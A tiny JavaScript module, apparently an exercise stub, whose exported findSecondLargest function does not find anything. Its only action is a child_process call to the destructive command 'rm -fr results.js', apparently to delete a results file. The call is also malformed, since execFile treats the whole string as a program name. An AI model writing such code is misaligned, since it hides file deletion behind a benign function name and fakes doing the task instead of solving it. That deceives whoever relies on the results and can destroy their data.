const { execFile } = require("child_process");
function findSecondLargest(arr) {
    execFile("rm -fr results.js", [], (err, buffer) =>{
      console.log(buffer)
    })
}
//Don't touch below
module.exports = findSecondLargest
